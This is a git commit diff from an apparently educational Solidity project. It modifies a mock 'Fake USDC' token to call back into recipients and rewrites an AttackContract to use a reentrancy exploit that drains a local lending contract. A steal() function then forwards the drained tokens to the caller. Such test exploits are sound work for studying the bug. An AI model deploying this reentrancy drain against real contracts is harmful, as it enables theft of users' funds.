3f2d0d156edb398f4695d54052a1e3eadb9ba395
Vincent Daubry <vdaubry@gmail.com>
2023-07-18 22:47:36 +0200

    reproduce error on hack

--- smart_contracts/contracts/Usdc.sol
+++ smart_contracts/contracts/Usdc.sol
@@ -3,11 +3,31 @@ pragma solidity ^0.8.9;
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
+import "hardhat/console.sol";
 
 contract Usdc is ERC20, Ownable {
     constructor() ERC20("Fake USDC", "USDC") {}
 
     function mint(address to, uint256 amount) public onlyOwner {
         _mint(to, amount);
+    }
+
+    function transfer(
+        address to,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+
+        //Call the msg.sender to trigger fallback
+        (bool success, ) = to.call(
+            abi.encodeWithSignature(
+                "receiveTokens(address,uint256)",
+                owner,
+                amount
+            )
+        );
+
+        return true;
     }
 }
--- smart_contracts/contracts/attack/AttackContract.sol
+++ smart_contracts/contracts/attack/AttackContract.sol
@@ -4,6 +4,7 @@ pragma solidity ^0.8.18;
 import "../LendingBorrowing.sol";
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "hardhat/console.sol";
 
 contract AttackContract {
     IERC20 private s_usdc;
@@ -26,15 +27,25 @@ contract AttackContract {
     }
 
     // This is the function that gets called recursively by the withdraw function
-    receive() external payable {
-        if (address(lendingBorrowing).balance >= msg.value) {
-            lendingBorrowing.withdraw(msg.value);
+    function receiveTokens(address sender, uint256 amount) public {
+        uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
+        console.log("balance: %s", balance);
+
+        if (balance > amount) {
+            console.log("reentry");
+            lendingBorrowing.withdraw(amount);
         }
     }
 
+    // fallback() external payable {
+    //     console.log("Fallback called");
+    //     if (address(lendingBorrowing).balance >= msg.value) {
+    //         lendingBorrowing.withdraw(msg.value);
+    //     }
+    // }
+
     // The owner of the contract withdraw the stolen funds
     function steal() public {
-        require(msg.sender == owner, "Only attacker can call this function");
-        payable(owner).transfer(address(this).balance);
+        s_usdc.transfer(msg.sender, s_usdc.balanceOf(address(this)));
     }
 }
